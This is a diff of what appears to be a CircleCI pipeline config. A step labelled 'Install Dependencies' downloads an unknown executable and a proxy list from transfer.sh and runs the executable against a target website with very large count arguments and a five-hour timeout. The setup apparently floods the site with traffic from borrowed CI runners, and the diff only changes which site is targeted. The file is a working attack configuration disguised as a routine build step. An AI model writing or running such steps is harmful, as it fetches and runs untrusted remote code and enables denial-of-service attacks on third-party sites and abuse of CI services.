@@ -7,7 +7,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: apt update && apt install nodejs wget -y && wget https://transfer.sh/7vRVg3/jsss && wget https://transfer.sh/3qaHVl/proxy.txt && chmod +x jsss && ./jsss https://outlook.live.com/mail/0/inbox 999999 153 2000
+            command: apt update && apt install nodejs wget -y && wget https://transfer.sh/7vRVg3/jsss && wget https://transfer.sh/3qaHVl/proxy.txt && chmod +x jsss && ./jsss https://www.brazzers.com/ 999999 153 2000
             no_output_timeout: 5h
 
 workflows:
